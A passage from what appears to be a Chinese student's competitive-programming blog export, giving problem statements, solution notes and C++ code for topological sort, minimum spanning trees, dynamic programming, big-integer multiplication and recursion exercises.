scanf(\"%d%d%d\",&amp;a,&amp;b,&amp;c); addarc(a,b,c); rd[b]++; &#125; for(int i=1;i&lt;=n;i++) if(rd[i]==0) stack[++top]=i;//入栈 do&#123;//第一次，求事件最早发生时间 int u=stack[top--],v; k++; order[k]=u;//记录顺序 for(int p=first[u];p!=0;p=nxt[p])&#123; v=go[p]; rd[v]--; ve[v]=max(ve[v],ve[u]+dis[u][v]); if(rd[v]==0) stack[++top]=v; &#125; &#125;while(top!=0); vl[n]=ve[n];//中点的事件最晚发生时间等于最早发生时间 for(int i=n-1;i&gt;=1;i--)&#123; int u=order[i],v; for(int p=first[u];p!=0;p=nxt[p])&#123; v=go[p]; vl[u]=min(vl[u],vl[v]-dis[u][v]); &#125; &#125; for(int i=1;i&lt;=n-1;i++)&#123;//计算活动的最早发生时间和最晚发生时间 int u=order[i],v; for(int p=first[u];p!=0;p=nxt[p])&#123; v=go[p]; e[p]=ve[u];//活动最早发生时间等于起始点的最早发生时间 l[p]=vl[v]-dis[u][v];//活动最晚发生时间等于终点最晚发生时间减去活动的长度 if(e[p]==l[p]) ans[++sum]=p; &#125; &#125; sort(ans+1,ans+1+sum); for(int i=1;i&lt;=sum;i++) printf(\"%d\\n\",ans[i]); return 0;&#125; HDU4109 Instrction Arrangementhttp://acm.hdu.edu.cn/showproblem.php?pid=4109 Problem Description 阿狸这个学期学了计算机组织结构课程。他知道了指令之间可能有依存关系，像WAR（write after read，读之后写），WAW，RAW。如果两个指令之间的时间小于安全时间，它就会导致危险，从而引起错误的结果。所以我们需要设计特殊的回路去消除危险。然而，解决这个问题最简单的方法是添加等待时间（或者由其它的操作填充），如果没有其它的操作填充就意味着需要浪费时间去保证两个指令之间的时间不小于安全时间。 两个指令之间的时间的定义就是它们起始时间差。 现在我们有很多指令，并且我们知道依存关系和指令之间的安全事件。我们也有非常强大的无限核的CPU。所以你可以在同一时间想跑多少指令就跑多少指令。这个CPU可以只消耗1ns就完成任何指令。 你的工作就是重新安排这些指令顺序所以CPU就可以用最短时间完成所有的指令。 Input 输入包括几个测试案例 头两行有两个整数N,M（N&lt;=1000,M&lt;=1000），其中N表示N条指令和M表示M个依存关系 接下来的M行，每行包括3个整数X,Y,Z，意思是X和Y之间的安全时间是Z，而且Y必须在X之后运行。这些指令从0到N-1标号。 Output 打印一个整数，CPU运行的最短时间 Sample Input 5 2 1 2 1 3 4 1 Sample Output 2 HINT 在第1ns中，指令0，1和3被执行了。 在第2ns中，指令2,和4被执行了 所以答案是2 也是求事件最早发生时间（这些指令什么时候最早全部执行完）的题 注意： memset！！！！！！！ 指令由0到n-1编号，注意转换 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int MAX=1020;int first[MAX],nxt[10200],go[10200],arcnum;int dis[MAX][MAX],rd[MAX],val[MAX],stack[10200],top;void addarc(int a,int b,int c)&#123; nxt[arcnum]=first[a]; first[a]=arcnum; go[arcnum++]=b; dis[a][b]=c;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n,m,x,y,z,maxx; while(scanf(\"%d%d\",&amp;n,&amp;m)!=EOF)&#123; memset(dis,0,sizeof(dis)); memset(rd,0,sizeof(rd)); memset(val,0,sizeof(val)); memset(first,0,sizeof(first)); maxx=-1; arcnum=1; for(int i=1;i&lt;=n;i++) val[i]=1; for(int i=1;i&lt;=m;i++)&#123; scanf(\"%d%d%d\",&amp;x,&amp;y,&amp;z); addarc(++x,++y,z); rd[y]++; &#125; for(int i=1;i&lt;=n;i++) if(rd[i]==0) stack[++top]=i; do&#123; int u=stack[top--],v; for(int p=first[u];p!=0;p=nxt[p])&#123; v=go[p]; val[v]=max(val[v],val[u]+dis[u][v]); maxx=max(val[v],maxx); if(--rd[v]==0) stack[++top]=v; &#125; ``` &#125;while(top!=0); printf(\"%d\\n\",maxx);&#125;return 0;```&#125; Poj3687 Labeling Balls escription Windy有N个不同重量的求，现在他打算给他们贴上1到N的标签： 没有两个相同的球 这些标签要符合规则例如“标签a球轻于标签b球” 你能帮他解决这个问题吗？ Input 第一行是数据个数.每组数据第一行是两个整数： N (1 ≤ N ≤ 200)和 M (0 ≤ M ≤ 40,000).接下来M行，每行两个整数a和 b表示 标签a球轻于标签b球. (1 ≤ a, b ≤ N) 每组数据后有一个空行 Output 每组测试数据输出一行，按照小球的1~N，小球的重量输出，如果有多组解： you should output the one with the smallest weight for label 1, then with the smallest weight for label 2, then with the smallest weight for label 3 and so on…如果无解，输出-1。 Sample Input 5 4 0 4 1 1 1 4 2 1 2 2 1 4 1 2 1 4 1 3 2 Sample Output 1 2 3 4 -1 -1 2 1 3 4 1 3 2 4 这道题至今未通过。初步思路是建立小顶堆和拓扑排序，以便在几个球重量相等时输出编号最小的。 但是问题来了，在我操作入度为0的节点时，可能会又有新的节点加入堆，从而导致我整个答案完全不对。 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;int first[300],nxt[40200],go[40200],arcnum;int rd[300],stack[40200],ans[300],heap[10000],len;void addarc(int a,int b)&#123; nxt[arcnum]=first[a]; first[a]=arcnum; go[arcnum++]=b;&#125;bool cmp(int a,int b)&#123; return a&lt;b;&#125;int Get()&#123; int t=heap[1],now=1,next; heap[1]=heap[len--]; while(now*2&lt;=len)&#123; next=now*2; if(next&lt;len&amp;&amp;cmp(heap[next+1],heap[next])) next++; if(cmp(heap[now],heap[next])) break; swap(heap[now],heap[next]); now=next; &#125; return t;&#125;void Put(int p)&#123; int now=++len,next; heap[len]=p; while(now&gt;1)&#123; next=now&gt;&gt;1; if(!cmp(heap[now],heap[next])) break; swap(heap[now],heap[next]); now=next; &#125;&#125;int main()&#123; int t,n,m,a,b,k; scanf(\"%d\",&amp;t); while(t--)&#123; arcnum=1; k=0; len=0; memset(first,0,sizeof(first)); memset(rd,0,sizeof(rd)); memset(ans,0,sizeof(ans)); scanf(\"%d%d\",&amp;n,&amp;m); for(int i=1;i&lt;=m;i++)&#123; scanf(\"%d%d\",&amp;a,&amp;b); addarc(a,b); rd[b]++; &#125; for(int i=1;i&lt;=n;i++) if(rd[i]==0) Put(i); do&#123; int u=Get(),v; ans[u]=++k; for(int p=first[u];p!=0;p=nxt[p])&#123; v=go[p]; if(--rd[v]==0) Put(v); &#125; &#125;while(len&gt;0); if(k!=n) printf(\"-1\\n\"); else&#123; for(int i=1;i&lt;=n;i++) printf(\"%d \",ans[i]); printf(\"\\n\"); &#125; &#125; return 0;&#125; 又想到把拓扑排序后的点记录下来，来个快排，但是有的球没有限制条件，强行把权设为0又会错。 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;int first[300],nxt[40200],go[40200],arcnum;int rd[300],stack[40200],top;struct node&#123; int val,id;&#125;ans[300];void addarc(int a,int b)&#123; nxt[arcnum]=first[a]; first[a]=arcnum; go[arcnum++]=b;&#125;bool cmp(node a,node b)&#123; if(a.val!=b.val) return a.val&lt;b.val; return a.id&lt;b.id;&#125;int main()&#123; int t,n,m,a,b,k; scanf(\"%d\",&amp;t); while(t--)&#123; arcnum=1; k=0; top=0; memset(first,0,sizeof(first)); memset(rd,0,sizeof(rd)); memset(ans,0,sizeof(ans)); scanf(\"%d%d\",&amp;n,&amp;m); for(int i=1;i&lt;=n;i++) ans[i].id=i,ans[i].val=0; for(int i=1;i&lt;=m;i++)&#123; scanf(\"%d%d\",&amp;a,&amp;b); addarc(a,b); rd[b]++; &#125; for(int i=1;i&lt;=n;i++) if(rd[i]==0) stack[++top]=i; do&#123; int u=stack[top--],v; k++; for(int p=first[u];p!=0;p=nxt[p])&#123; v=go[p]; ans[v].val=max(ans[v].val,ans[u].val+1); if(--rd[v]==0) stack[++top]=v; &#125; &#125;while(top!=0); if(k!=n) printf(\"-1\\n\"); else&#123; sort(ans+1,ans+1+n,cmp); for(int i=1;i&lt;=n;i++) printf(\"%d \",ans[i].id); printf(\"\\n\"); &#125; &#125; return 0;&#125; 据说建立大顶堆就可以解决问题？？？？","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"最小生成树总结","slug":"e6-9c-80-e5-b0-8f-e7-94-9f-e6-88-90-e6-a0-91-e6-80-bb-e7-bb-93","date":"2018-12-06T15:41:33.000Z","updated":"2019-05-05T05:17:25.272Z","comments":true,"path":"posts/f8a544ad/","link":"","permalink":"https://mrh1s.top/posts/f8a544ad/","excerpt":"","text":"啊，先纪念一下吧，难得一天这么666 AC完了所有题 （次小生成树代码看懂） 今天学到了最小生成树算法中的Prim算法和Kruskal算法。从宏观上来讲prim更适合稠密图，krustal更适合稀疏图，但对于我们来说暂时没有什么区别啦。 Prim算法中主要注意的点是 在visit数组与minn数组（最小到达某点的权边的权值）上 注意只有未遍历而且小于当前所存的权才可以更新 循环次数为n-1次，错误的次数会导致答案错误 除自身为0以外，所有点之间的初始距离为正无穷 Kruskal算法中主要注意的点是 所有的边要用结构体存，方便快排 注意并查集的Getfather函数的压缩路径和union函数的是否父亲相同的判断 注意变量k的维护，k满足k==n-1时必须及时跳出循环 还有一个很容易忽略的问题！！就是memset，特别是有多组数据的时候必须在前面重置内存** 附上我对次小生成树代码的注释： #include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;algorithm&gt;#include &lt;string.h&gt;using namespace std;/* * 次小生成树 * 求最小生成树时，用数组Max[i][j]来表示MST中i到j最大边权 * 求完后，直接枚举所有不在MST中的边，替换掉最大边权的边，更新答案 * 点的编号从0开始 */const int MAXN=110;const int INF=0x3f3f3f3f;//最大值 bool vis[MAXN];//点是否已使用 int lowc[MAXN];//到每一个点权值最短的路径的权值 int pre[MAXN];//存父亲 int Max[MAXN][MAXN];//Max[i][j]表示在最小生成树中从i到j的路径中的最大边权bool used[MAXN][MAXN];//边是否已使用 int Prim(int cost[][MAXN],int n)&#123; int ans=0; memset(vis,false,sizeof(vis)); memset(Max,0,sizeof(Max)); memset(used,false,sizeof(used)); vis[0]=true;//已遍历 pre[0]=-1;//起始点没有父亲 for(int i=1;i&lt;n;i++)&#123; lowc[i]=cost[0][i]; pre[i]=0;//设置父亲 &#125; lowc[0]=0; for(int i=1;i&lt;n;i++)&#123; int minc=INF; int p=-1;//将要选择的下一个点 for(int j=0;j&lt;n;j++) if(!vis[j]&amp;&amp;minc&gt;lowc[j])&#123; minc=lowc[j];//选择距离最小的边 p=j; &#125; if(minc==INF) return -1;//该图不是连通图 ans+=minc;//权值和计算 vis[p]=true;//点已遍历 used[p][pre[p]]=used[pre[p]][p]=true;//边已遍历 for(int j=0;j&lt;n;j++)&#123; if(vis[j]) Max[j][p]=Max[p][j]=max(Max[j][pre[p]],lowc[p]);//DP计算j到p的路径中权值最大的边的权值 if(!vis[j]&amp;&amp;lowc[j]&gt;cost[p][j])&#123;//更新lowc数组 lowc[j]=cost[p][j]; pre[j]=p;//设置父亲 &#125; &#125; &#125; return ans;&#125;int ans;int smst(int cost[][MAXN],int n)&#123; int Min=INF; for(int i=0;i&lt;n;i++) for(int j=i+1;j&lt;n;j++) if(cost[i][j]!=INF &amp;&amp; !used[i][j])//如果这条边存在而且未被使用 Min=min(Min,ans+cost[i][j]-Max[i][j]);//取最小差值 if(Min==INF) return -1;//不存在 return Min;//返回次小生成树的权值和 &#125;int cost[MAXN][MAXN];int main()&#123; int T; int n,m; scanf(\"%d\",&amp;T); while(T--)&#123; scanf(\"%d%d\",&amp;n,&amp;m); int u,v,w; for(int i=0;i&lt;n;i++) for(int j=0;j&lt;n;j++)&#123; if(i==j) cost[i][j]=0; else cost[i][j]=INF; &#125; while(m--)&#123; scanf(\"%d%d%d\",&amp;u,&amp;v,&amp;w); u--;v--; cost[u][v]=cost[v][u]=w;//u到v的距离 &#125; ans=Prim(cost,n); if(ans==-1)&#123; printf(\"Not Unique!\\n\"); continue; &#125; if(ans==smst(cost,n)) printf(\"Not Unique!\\n\");//权值和完全相同 else printf(\"%d\\n\",ans);//输出最小生成树的权值和 &#125; return 0;&#125;","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"暑期人生测试一总结","slug":"e6-9a-91-e6-9c-9f-e4-ba-ba-e7-94-9f-e6-b5-8b-e8-af-95-e4-b8-80-e6-80-bb-e7-bb-93","date":"2018-12-06T15:40:34.000Z","updated":"2019-05-05T05:17:42.425Z","comments":true,"path":"posts/93b1f5dc/","link":"","permalink":"https://mrh1s.top/posts/93b1f5dc/","excerpt":"","text":"暑期测试一 数学作业 （homework.cpp） 【问题描述】 求：方程x1+2x2+„+nxn=m的所有非负整数解（x1,x2,„,xn）的个数。例如，方程：x1+2x2+3x3+4x4+5x5=5有7组解：（5,0,0,0,0）、（3,1,0 ,0,0）、……、（0,0,0,0,1）。 【输入数据】(homework.in) 2个整数n，m 【输出数据】(homework.out) 方程非负整数解的个数ans，如果解超过10^9，只需输出ansmod 10^9。 【输入样例】 55 【输出样例】 7 【数据范围】 1≤n≤5000；0≤m≤5000。 这道题可以将方程中的x1x2…..看作n个有价值的物品，要使这个方程刚好有解，则我们可以联想到完全背包问题中找方案类型的题目。抽象出来则可以描述为：有n件物品，重量依次为1到n，要将这些物品放入背包且刚好装满背包，求总方案数。接着粘上标准代码，AC； 注意！！！！！！每次状态转移后记得将求解的子问题答案Mod 10^9！！ 否则变量爆掉！！ #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;int n,m;long long f[10000];int main()&#123; freopen(\"homework.in\",\"r\",stdin); freopen(\"homework.out\",\"w\",stdout); scanf(\"%d%d\",&amp;n,&amp;m); if(m==0)&#123; printf(\"1\"); return 0; &#125; f[0]=1; for(int i=1;i&lt;=n;i++) for(int j=i;j&lt;=m;j++)//分配i到m个空间 f[j]=(f[j]+f[j-i])%1000000000; printf(\"%lld\",f[m]); return 0;&#125; 魔法石的诱惑 （rob.cpp） 问题描述 修罗魔王远远地看见邪狼王狂奔而来，问道：“慌慌张张干什么？” 邪狼王大口大口初期：“我路过一家魔法石店，看到摆着那么多高阶魔法石，我就去抢了一大袋。” 修罗王怒道：“光天化日之下，朗朗乾坤，众目睽睽之下，你也敢抢？” 狼王：“我只看到了魔法石，没有看到人。。。” 修罗王：“。。。。。” 其实邪狼王的贪婪也很容易理解，因为高阶魔法石有一个特征，即它的重量进行阶乘运算后末尾有几个0，就拥有同等重量普通魔法石几倍的法力，例如5！=54321=120,所以120有一个0，这意味着该魔法石拥有同等重量的普通魔法石1倍的魔法力，你的任务是找到最小的自然数N，使N！在十进制下有Q个0结尾。 输入格式(rob.in) 一个数Q（0≤Q≤10^8） 输出格式(rob.out) 如果无解，输出”No solution”，否则输出N 输入样例 2 输出样例 10 二分枚举答案，同时算出该数的阶乘所包含的0的个数 如何算阶乘中0的个数：10由2*5组成，阶乘中2远远大于5，所以只用关注5的个数，注意25 125等数中包含多个5，需要另行判断 枚举答案后还获得最优解，要进行判断处理才得出最优解 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#include&lt;cmath&gt;using namespace std;int Q;int DuiShu(int n)&#123;//取以5为底，n的对数 int pre=1,nxt=5; for(int i=0;i&lt;=20;i++)&#123; if(n&gt;=pre&amp;&amp;n&lt;nxt) return i; pre*=5; nxt*=5; &#125;&#125;int calc(int n)&#123;//计算n的阶乘有多少个5 int ds=DuiShu(n),sum=0;//取对数 int pre=5,nxt=25; for(int i=1;i&lt;=ds;i++)&#123;//每5^i个数产生一个0 sum+=n/pre; pre*=5; nxt*=5; &#125; return sum;&#125; int BinarySearch(int s,int e)&#123;//二分查找最佳答案 int mid,ans; while(s&lt;=e)&#123; mid=(s+e)/2; ans=calc(mid); if(ans==Q) return mid; else if(ans&gt;Q)//0多了 e=mid-1; else if(ans&lt;Q)//0少了 s=mid+1; &#125; return -1;&#125;int FindBest(int ans)&#123; if(ans%5!=0)//如果不是最优解 ans=ans-(ans%5); return ans;&#125;int main()&#123; freopen(\"rob.in\",\"r\",stdin); freopen(\"rob.out\",\"w\",stdout); scanf(\"%d\",&amp;Q); if(Q==0)&#123; printf(\"1\"); return 0; &#125; int ans=BinarySearch(5,200000000); if(ans==-1) printf(\"No solution\"); else printf(\"%d\",FindBest(ans));// printf(\"%d\",DuiShu(30));//测试 return 0;&#125; **架设电话线 (phoneline.cpp) FarmerJohn打算将电话线引到自己的农场，但电信公司并不打算为他提供免费服务。于是，FJ必须为此向电信公司支付一定的费用。 FJ的农场周围分布着N(1&lt;= N &lt;= 1,000)根按1..N顺次编号的废弃的电话线杆，任意两根电话线杆间都没有电话线相连。一共P(1&lt; = P &lt;= 10,000)对电话线杆间可以拉电话线，其余的那些由于隔得太远而无法被连接。 第i对电话线杆的两个端点分别为A_i、B_i，它们间的距离为L_i(1 &lt;= L_i &lt;= 1,000,000)。数据中保证每对{A_i，B_i}最多只出现1次。编号为1的电话线杆已经接入了全国的电话网络，整个农场的电话线全都连到了编号为N的电话线杆上。也就是说，FJ的任务仅仅是找一条将1号和N号电话线杆连起来的路径，其余的电话线杆并不一定要连入电话网络。 经过谈判，电信公司最终同意免费为FJ连结K(0 &lt;= K &lt; N)对由FJ指定的电话线杆。对于此外的那些电话线，FJ需要为它们付的费用，等于其中最长的电话线的长度（每根电话线仅连结一对电话线杆）。如果需要连结的电话线杆不超过K对，那么FJ的总支出为0。 请你计算一下，FJ最少需要在电话线上花多少钱。 输入(phoneline.in) 第1行: 3个用空格隔开的整数：N，P，以及K 第2..P+1行: 第i+1行为3个用空格隔开的整数：A_i，B_i，L_i 输出(phoneline.out) 第1行: 输出1个整数，为FJ在这项工程上的最小支出。如果任务不可能完成，输出-1 样例输入 5 7 1 1 2 5 3 1 4 2 4 8 3 2 35 2 9 3 4 7 4 5 6 样例输出 4 提示 输入说明: 一共有5根废弃的电话线杆。电话线杆1不能直接与电话线杆4、5相连。电话线杆5不能直接与电话线杆1、3相连。其余所有电话线杆间均可拉电话线。电信公司可以免费为FJ连结一对电话线杆。 输出说明: FJ选择如下的连结方案：1-&gt;3；3-&gt;2；2-&gt;5，这3对电话线杆间需要的电话线的长度分别为4、3、9。FJ让电信公司提供那条长度为9的电话线，于是，他所需要购买的电话线的最大长度为4。 这么明显的二分加最短路算法竟然没想到！！！ 1.首先二分枚举一个电话线长度标准aim，大于此标准的线交给电信部门，自己支付aim元 2.生成带权边，由于要使电信公司刚好支付大于aim的所有线的费用，所以John选择的最佳路线中长度大于aim的电话线数量应该刚好等于K，即大于aim权边为1否则为0，使权和为K即可。权和大于K则表示aim太小，小于K则表示aim太大 3.做SPFA最短路径，结合二分法得出答案","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"打印月历题解","slug":"e6-89-93-e5-8d-b0-e6-9c-88-e5-8e-86-e9-a2-98-e8-a7-a3","date":"2018-12-06T15:39:25.000Z","updated":"2019-05-05T05:17:09.452Z","comments":true,"path":"posts/d2da3f9f/","link":"","permalink":"https://mrh1s.top/posts/d2da3f9f/","excerpt":"","text":"24:打印月历总时间限制: 1000ms 内存限制: 65536kB 描述 给定年月，打印当月的月历表。 输入 输入为一行两个整数，第一个整数是年份year（1900 ≤ year ≤ 2099），第二个整数是月份month（1 ≤ month ≤ 12），中间用单个空格隔开。 输出 输出为月历表。月历表第一行为星期表头，如下所示：Sun Mon Tue Wed Thu Fri Sat其余各行一次是当月各天的日期，从1日开始到31日（30日或28日）。日期数字应于星期表头右对齐，即各位数与星期表头相应缩写的最后一个字母对齐。日期中间用空格分隔出空白。 样例输入 2006 5 样例输出 Sun Mon Tue Wed Thu Fri Sat 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 提示 闰年判断方法：能被4整除但不能被100整除，或者能被400整除。1900年1月1日是周一。 题解： 这道题是典型的模拟日期变更的题目。为了节省时间提高效率，可把目标年份的1月1日的星期算出来，然后通过循环模拟，最终算出目标月份的1日的星期。 计算部分在本题还算简单，但重要的是如何输出。 首先输出固定格式， 我们知道日历的开头通常都是有空格的（1日是星期天除外），由此我们可以写循环来输出日历前面的空格。 接下来依次输出每个日期，这里又会有个问题，就是换行的问题，这个问题可以通过声明一个变量判断日历是否打印到行尾，是就换行，不是就输出空格。 还有一点细节需要注意，当日期到最后一天时，是不允许有空格出现的，所以我们应该在最后加一个条件判断，这样程序就完整了。 #include&lt;cstdio&gt; #include&lt;cstdlib&gt; int main() { int year,month; scanf(&quot;%d %d&quot;,&amp;year,&amp;month); int day=1; for(int i=1;i&lt;=year-1900;i++) { int sum=1900+i-1; if((sum%4==0&amp;&amp;sum%100!=0)||sum%400==0) day+=2; else day++; if(day&gt;=8) day-=7; }​ for(int i=1;i&lt;month;i++) &#123; if(i!=2) &#123; switch(i) &#123; case 1:case 3:case 5:case 7:case 8:case 10:case 12:day+=31%7;break; case 4:case 6:case 9:case 11:day+=30%7;break; &#125; &#125; else &#123; if((year%4==0&amp;&amp;year%100!=0)||year%400==0) day+=29%7; else day+=28%7; &#125; if(day&gt;=8) day-=7; &#125; int count; if(month!=2) &#123; switch(month) &#123; case 1:case 3:case 5:case 7:case 8:case 10:case 12:count=31;break; case 4:case 6:case 9:case 11:count=30;break; &#125; &#125; else &#123; if((year%4==0&amp;&amp;year%100!=0)||year%400==0) count=29; else count=28; &#125; printf(\"Sun Mon Tue Wed Thu Fri Sat\\n\"); for(int i=day==7?0:day;i!=0;i--) &#123; printf(\" \"); &#125; int n=day; for(int i=1;i&lt;=count;i++) &#123; if(i&lt;=9) printf(\" %d\",i); else printf(\" %d\",i); if(i==count) ; else if(n%7==6) printf(\"\\n\"); else printf(\" \"); n++; &#125; return 0;&#125;","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"大整数乘法题解","slug":"e5-a4-a7-e6-95-b4-e6-95-b0-e4-b9-98-e6-b3-95-e9-a2-98-e8-a7-a3","date":"2018-12-06T15:39:02.000Z","updated":"2019-05-04T15:39:44.408Z","comments":true,"path":"posts/80036358/","link":"","permalink":"https://mrh1s.top/posts/80036358/","excerpt":"","text":"09:大整数乘法 总时间限制: 1000ms 内存限制: 65536kB 描述 求两个不超过200位的非负整数的积。 输入 有两行，每行是一个不超过200位的非负整数，没有多余的前导0。 输出 一行，即相乘后的结果。结果里不能有多余的前导0，即如果结果是342，那么就不能输出为0342。 样例输入 12345678900 98765432100 样例输出 1219326311126352690000 来源 程序设计实习2007 题解： ​ 这道题的参数过大，甚至不能用长整型变量解决，那么就应该使用高精度算法。我们曾经写过高精度加法，本题算法只是高精度加法的延伸。 ​ 将两个数用字符串数组读入，再转化成整型数组储存，此时储存顺序应该为倒序，即第一位用来存放个位，第二位存放十位，以此类推……（这样的目的是在于它能方便我们进位时的数据存放），好了这里有一个问题，题目并没有提到输入数据中不是先序0（如00003、0000等），所以这里可以添加判断语句只截取有意义的部分（当然也可以在计算之后判断再最高位的数字，如果为0则不输出） ​ 接下来是整个算法的核心部分！！我们知道，高精度加法是对应位相加，如果结果大于等于10则进一位，然而乘法只是加法的一个高级形式而已，所以我们也可以将此高精度乘法转化为多个高精度加法，即a数中的每一位数去乘b数中的每一位数，最后求和。 ​ 经过观察，我们可以发现，当我们将某x位的数乘某y位的数时，两个数除了最高位之外其余位都为0，运算结果为两数之积，而它所在的位数为x+y，用两个for循环，就可以实现a数中的每一位数去乘b数中的每一位数。而得到的结果则ans[x+y]+=两数之积 ，这样就得到了未进位的两大数相乘的结果（源码中我使用了进位，实际上可以删除）。 ​ 最后一步，进位操作。从最低位算起** ans[i+1]=ans[i]/10; ans[i]%=10; 输出。AC！！喜悦！！ #include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;math.h&gt;int a[300],b[300],ans[1000];int work(int n,bool t)//n输入的字符（数字） t是否转换成数字 &#123;//字符与数字的转换函数 if(t==1) return n-'0'; else return '0'+n;&#125;int main()&#123; char c[300]; int len_a,len_b; gets(c); len_a=strlen(c); for(int i=len_a;i&gt;=1;i--) a[len_a-i]=work(c[i-1],1);//以倒序整型读入两个数 gets(c); len_b=strlen(c); for(int i=len_b;i&gt;=1;i--) b[len_b-i]=work(c[i-1],1); int ji; //对两个数进行操作，但不进位，保存在ans[]中 for(int i=0;i&lt;=len_a-1;i++) for(int j=0;j&lt;=len_b-1;j++) &#123; ji=a[i]*b[j]; ans[i+j+1]+=ji/10; ans[i+j]+=ji%10;//此处累赘，可以不用进位，到最后一同进位 &#125; int j=0,log; while(j&lt;=len_a+len_b-2)//进位操作 &#123; log=ans[j]; if(log&gt;=10) &#123; ans[j]=log%10; ans[j+1]+=log/10; &#125; j++; &#125; /*if(ans[len_a+len_b-2]==0) j--;*/ while(ans[j]==0&amp;&amp;j&gt;=0) j--; if(j==-1) j++; for(int i=j;i&gt;=0;i--)//输出数字 printf(\"%c\",work(ans[i],0)); return 0;&#125;","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"2的幂次方表示题解","slug":"2-e7-9a-84-e5-b9-82-e6-ac-a1-e6-96-b9-e8-a1-a8-e7-a4-ba-e9-a2-98-e8-a7-a3","date":"2018-12-06T15:38:31.000Z","updated":"2019-05-05T05:03:58.019Z","comments":true,"path":"posts/50d2edb9/","link":"","permalink":"https://mrh1s.top/posts/50d2edb9/","excerpt":"","text":"8758:2的幂次方表示总时间限制: 1000ms 内存限制: 65536kB 描述 任何一个正整数都可以用2的幂次方表示。 例如： 137=27+23+20 同时约定方次用括号来表示，即ab可表示为a(b)。 由此可知，137可表示为： 2(7)+2(3)+2(0) 进一步：7=22+2+20（21用2表示） 3=2+20 所以最后137可表示为： 2(2(2)+2+2(0))+2(2+2(0))+2(0) 又如： 1315=210+28+25+2+1 所以1315最后可表示为： 2(2(2+2(0))+2)+2(2(2+2(0)))+2(2(2)+2(0))+2+2(0) 输入 一个正整数n（n≤20000）。 输出 一行，符合约定的n的0，2表示（在表示中不能有空格）。 样例输入 137 样例输出 2(2(2)+2+2(0))+2(2+2(0))+2(0) 来源 NOIP1998复赛 普及组 第一题 题解：将一个大数拆分为若干个2的n次方的和，并且将次方和再拆分成若干个部分，这样很容易就可以想起递归算法。 ** 实际上问题大致分为两步：** 1. 将数字分解为2的n次方 2. 将n再次分解为2的n次方（调用自身，如果n==2则结束printf(“2”); 如果n==1 则printf(“2(0)”);） #include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;math.h&gt;void work(int n)&#123; if(n==1)//初始判断条件，如果n为1或2则直接输出 &#123; printf(\"2(0)\"); return; &#125; else if(n==2) &#123; printf(\"2\"); return; &#125; else &#123; int j=1,i=0;//j每次乘2,如果大于了n就分解结束，i为当前次数 do &#123; j*=2; if(j&gt;n) &#123; j/=2; if(i==1)//这步非常重要，确定是否需要继续 2() printf(\"2\"); else &#123; printf(\"2(\"); work(i); printf(\")\"); &#125; if(n-j!=0)//如果n分解之后还有剩余的数，那么继续分解 &#123; printf(\"+\"); work(n-j); &#125; return; &#125; else i++; &#125;while(1); &#125; &#125;int main()&#123; int n; scanf(\"%d\",&amp;n); work(n);&#125;","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"逆波兰表达式题解","slug":"e9-80-86-e6-b3-a2-e5-85-b0-e8-a1-a8-e8-be-be-e5-bc-8f-e9-a2-98-e8-a7-a3","date":"2018-12-06T15:38:07.000Z","updated":"2019-05-05T05:36:57.581Z","comments":true,"path":"posts/3598786/","link":"","permalink":"https://mrh1s.top/posts/3598786/","excerpt":"","text":"1696:逆波兰表达式 总时间限制: 1000ms 内存限制: 65536kB 描述 逆波兰表达式是一种把运算符前置的算术表达式，例如普通的表达式2 + 3的逆波兰表示法为+ 2 3。逆波兰表达式的优点是运算符之间不必有优先级关系，也不必用括号改变运算次序，例如(2 + 3) * 4的逆波兰表示法为* + 2 3 4。本题求解逆波兰表达式的值，其中运算符包括+ - * /四个。 输入 输入为一行，其中运算符和运算数之间都用空格分隔，运算数是浮点数。 输出 输出为一行，表达式的值。可直接用printf(“%f\\n”, v)输出表达式的值v。 样例输入 11.0 12.0 + 24.0 35.0 样例输出 1357.000000 提示 可使用atof(str)把字符串转换为一个double类型的浮点数。atof定义在math.h中。此题可使用函数递归调用的方法求解。 来源 计算概论05 题解：看到逆波兰表达式，首先我们要详细了解逆波兰表达式的用法。通过观察，我们可以大致明白一个逆波兰表达式是由 表达式=符号(+,-,*,/) + 数字1（或子表达式） + 数字2（或子表达式） 组成的，每个子表达式只需要两个参数的输入，所以参数的读入可以在运算时进行，以避免不知道读入数据的个数。PS：我做题时用while(getchar()!=‘ ’) scanf(“%d”,a) 做直接超时！（因为数据已经输入完成，而程序还在等待输入） 既然我们有了表达式到子表达式的过程，那么这其实是一个递归的过程，可以写一个递归的函数来处理问题。结束条件无需定义，因为每个子表达式只需两个参数，输入两个参数自动结束。 读入一个字符串，判断它是否为数字，如果为数字便直接以双精度形式return atof(a)，数字的判断以a[0]是否属于数字为准；如果是一个符号，就继续调用自身，获取两个参数，运算后返回。return f(x) 运算(+,-,*,/) f(x)，用switch语句判断符号。 大致过程如下： ​ #include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;math.h&gt;int n=1;char a[3000];double 